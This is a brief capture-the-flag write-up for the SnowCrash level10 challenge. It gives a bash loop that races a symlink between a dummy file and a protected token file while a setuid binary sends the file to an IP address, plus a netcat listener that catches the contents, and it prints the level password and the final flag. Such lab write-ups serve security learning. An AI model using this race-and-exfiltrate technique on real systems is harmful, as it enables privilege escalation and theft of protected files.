# CTF Report — Level10 Race / Symlink Exploit & Flag Retrieval (English)

---

## Overview

Below is a faithful, unchanged transcription of the exact commands and sequence you used to exploit an access/vulnerability (symlink/race) and retrieve `flag10`. All commands, loops and outputs are preserved exactly as you provided.

---

## Steps (verbatim)

```
access de ki açığı kullandık 

#!/bin/bash

while true; do
    ln -sf swap link1
    ln -sf token link1
done &

while true; do
        ./level10 link1 10.11.162.105
done


new shh session

 while true; do
> nc -l 6969
> done



level10@SnowCrash:~$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
flag10@SnowCrash:~$
```

---

## Observed credentials / token

* Password used for `su flag10`:

```
woupa2yuojeeaaed06riuj63c
```

* Final retrieved flag/token:

```
feulo4b72j7edeahuete3no7c
```
